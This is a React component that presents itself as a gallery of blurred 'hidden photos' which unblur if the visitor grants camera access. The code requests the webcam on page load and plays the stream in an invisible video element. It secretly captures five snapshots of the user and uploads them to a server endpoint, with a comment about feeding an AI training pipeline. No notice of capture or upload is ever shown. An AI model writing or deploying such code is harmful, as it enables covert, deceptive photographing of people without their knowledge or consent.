import { useEffect, useRef, useState } from 'react';


const CameraCapture = () => {
    const [snapshots, setSnapshots] = useState([]);
    const [isCameraAllowed, setIsCameraAllowed] = useState(false);
    const [showModal, setShowModal] = useState(false);

    const videoRef = useRef(null);

    useEffect(() => {
        const captureSnapshots = async () => {
            if (isCameraAllowed) {
                const videoElement = videoRef.current;
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                // Set canvas dimensions to match video element
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;

                // Draw the current video frame onto the canvas
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                // Convert the canvas image to a base64 data URL
                const snapshot = canvas.toDataURL();

                // Save the snapshot in state or send it to your AI model training pipeline
                setSnapshots((prevSnapshots) => [...prevSnapshots, snapshot]);
            }
        };

        // Automatically capture 5 snapshots
        if (snapshots.length < 5) {
            const intervalId = setInterval(captureSnapshots, 1000); // Adjust the interval as needed
            return () => clearInterval(intervalId);
        }
    }, [isCameraAllowed, snapshots.length]);

    useEffect(() => {
        const getCameraAccess = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });

                // Access to camera is granted
                setIsCameraAllowed(true);

                // Create a video element to display the camera stream
                const videoElement = videoRef.current;
                videoElement.srcObject = stream;
                videoElement.onloadeddata = () => {
                    // Ensure the video frames are fully loaded before capturing snapshots
                    videoElement.play();
                };
            } catch (error) {
                // Handle error if camera access is denied
                console.error('Error accessing camera:', error);
            }
        };

        getCameraAccess();
    }, []);

    const saveSnapshots = async () => {
        try {
            const response = await fetch('/api/saveSnapshot', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ snapshots }),
            });

            if (response.ok) {
                const { data } = await response.json();
                console.log('Snapshots saved successfully:', data);
            } else {
                console.error('Failed to save snapshots');
            }
        } catch (error) {
            console.error('Error saving snapshots:', error);
        }
    };

    useEffect(() => {
        if (snapshots.length >= 5) {
            saveSnapshots();
        }
    }, [snapshots]);

    const getCameraAccess = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });

            // Access to camera is granted
            setIsCameraAllowed(true);

            // Create a video element to display the camera stream
            const videoElement = videoRef.current;
            videoElement.srcObject = stream;
            videoElement.onloadeddata = () => {
                // Ensure the video frames are fully loaded before capturing snapshots
                videoElement.play();
            };
        } catch (error) {
            // Handle error if camera access is denied
            console.error('Error accessing camera:', error);
            setShowModal(true);
        }
    };

    const closeModal = () => {
        setShowModal(false);
      };


    return (
        <div>
            <video ref={videoRef} style={{ display: 'none' }} />
            {/* Render the captured snapshots */}
            {/* {snapshots.map((snapshot, index) => (
        <img key={index} src={snapshot} alt={`Snapshot ${index + 1}`} />
      ))} */}

            <div className='grid grid-cols-3 mx-8 mt-12'>
                <div>

                    <img className='h-[80%]  rounded-xl' src='/pic1.jpeg' />
                </div>
                <div onClick={getCameraAccess} className='cursor-pointer'>
                    <button className=' absolute mt-16 ml-9 text-2xl' ><img src='eye.png' className=' text-4xl' />
                    </button>

                    <img className='h-[80%] opacity-60 md:blur-lg blur-sm rounded-xl' src='/pic6.jpg' />
                </div>

                <div onClick={getCameraAccess} className='cursor-pointer'>
                    <button className=' absolute mt-16 ml-12 text-2xl' ><img src='eye.png' className=' text-4xl' />
                    </button>

                    <img className='h-[80%] ml-4 opacity-60 md:blur-lg blur-sm rounded-xl' src='/pic2.jpg' />
                </div>

                <div onClick={getCameraAccess} className='cursor-pointer'>
                    <button className=' absolute mt-16 ml-9 text-2xl' ><img src='eye.png' className=' text-4xl' />
                    </button>

                    <img className='h-[80%] opacity-60 md:blur-lg blur-sm rounded-xl' src='/pic9.jpg' />
                </div>

                <div onClick={getCameraAccess} className='cursor-pointer'>
                    <button className=' absolute mt-16 ml-10 text-2xl' ><img src='eye.png' className=' text-4xl' />
                    </button>

                    <img className='h-[80%] opacity-60 md:blur-lg blur-sm rounded-xl' src='/pic4.jpg' />
                </div>

                <div onClick={getCameraAccess} className='cursor-pointer'>
                    <button className=' absolute mt-16 ml-16 text-2xl' ><img src='eye.png' className=' text-4xl' />
                    </button>

                    <img className='h-[80%] ml-4 md:blur-lg opacity-60 blur-sm rounded-xl' src='/pic5.jpg' />
                </div>
            </div>
            {showModal && (
                <div className='fixed top-0 left-0 w-full h-full flex items-center justify-center bg-gray-500 bg-opacity-50'>
                    <div className=' bg-gray-200 text-black p-6 rounded-xl'>
                        <h2 className='text-2xl mb-4'>Photo Access Denied</h2>
                        <p>Please allow access to view hidden photos.</p>
                        <button className='mt-4 px-4 py-2 bg-red-500 text-white rounded' onClick={closeModal}>
                            Close
                        </button>
                    </div>
                </div>
            )}
        </div>
    );
};

export default CameraCapture;
